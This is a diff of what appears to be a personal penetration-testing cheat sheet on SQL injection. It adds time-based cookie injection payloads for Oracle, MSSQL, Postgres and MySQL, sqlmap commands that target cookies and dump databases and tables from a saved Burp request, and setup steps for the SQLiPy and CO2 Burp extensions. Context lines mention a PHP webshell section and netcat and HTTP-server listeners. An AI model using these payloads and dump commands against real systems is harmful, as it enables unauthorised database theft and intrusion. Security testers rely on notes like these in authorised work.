@@ -23,11 +23,17 @@ http://192.168.200.5/room.php?cod=1'
 Error/no-graphic = We have injection
 
 =================================== 
-Cookie Injection
+Cookie + Timebased Injection
+
 Cookie: TrackingId=x'||dbms_pipe.receive_message(('a'),10)  ..oracle
 Cookie: TrackingId=x'||WAITFOR DELAY '0:0:10'               ..MSSQL
 Cookie: TrackingId=x'||pg_sleep(10)                         ..Postgres
 Cookie: TrackingId=x'||sleep(10)                            ..mysql
+
+Sqlmap Cookie attack
+Add a * when you want sqlmap to attack something specific
+sqlmap -u 'https://site/' --cookie='TrackingId=8g3RMzFVP*;session=8KZ7YvSx'
+
 
 =================================== 
 PHP Webshell
@@ -51,12 +57,27 @@ python3 -m http.server 80
 nc -lvnp 53
 
 =================================== 
-Burp + Sqlmap
+Burp Request in Sqlmap
 
-GET Request > R.Click Copy to File
+Burp > GET Request > R.Click > Copy to File 'burp.req'
 sqlmap -r burp.req --batch --dbs
 sqlmap -r burp.req --batch -D somedb --tables
 sqlmap -r burp.req --batch -D somedb -T sometble --dump --threads 10
+
+=================================== 
+Burp Extensions
+
+SQLiPy
+https://github.com/PortSwigger/sqli-py
+Install older jython = 2.7.2
+Install SQLiPy from the BApp Store
+Start the API
+Target > Request > Extensions > Send to SQPiPy
+Can do multiples.. manually.. click to start each
+Result will show as a Finding under "Issues"
+
+CO2 extension
+Can help build Sqlmap statements
 
 
 =================================== 
